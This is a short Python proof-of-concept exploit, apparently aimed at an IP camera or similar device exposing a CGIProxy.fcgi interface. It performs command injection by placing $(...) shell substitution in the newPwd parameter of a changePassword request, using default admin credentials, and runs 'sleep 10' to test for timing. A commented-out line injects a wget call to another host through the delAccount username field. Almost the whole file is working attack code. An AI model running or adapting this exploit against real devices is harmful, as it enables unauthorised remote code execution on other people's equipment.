import requests

IP = '192.168.0.175'
Port = 88
BaseURL = f'http://{IP}:{Port}/cgi-bin/CGIProxy.fcgi'
Username = 'admin'
Password = ''
# Inject = '$(wget http://192.168.233.1)'

def beachhead():
    # Overwrite
    print(send_shell_command("sleep 10").content)

def send_shell_command(cmd):
    fmt = "+".join(cmd.split(" "))
    return requests.get(f'{BaseURL}?usr={Username}&pwd={Password}&cmd=changePassword&usrName=steven&oldPwd=test&newPwd=$({fmt})')
    
# print(requests.get(f'{BaseURL}?usr={Username}&pwd={Password}&cmd=delAccount&usrName={Inject.replace(" ", "+")}&usrPwd=&').content.decode('utf-8'))
beachhead()